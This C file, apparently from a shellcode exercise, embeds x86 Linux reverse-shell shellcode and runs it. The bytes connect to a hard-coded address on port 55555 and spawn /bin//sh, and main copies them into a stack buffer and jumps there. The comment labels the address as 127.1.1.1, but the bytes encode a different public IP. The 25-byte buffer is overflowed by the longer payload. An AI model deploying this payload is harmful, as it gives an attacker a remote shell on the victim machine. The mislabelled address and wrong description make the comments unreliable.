/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>

const char code[] = \
"\x68"
"\x67\x32\xfd\xbe"  // <- IP Number "127.1.1.1"
"\x5e\x66\x68"
"\xd9\x03"          // <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";
;

int main(int argc, char **argv)
{
   char buf[25];
   printf("%d",sizeof(code));
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
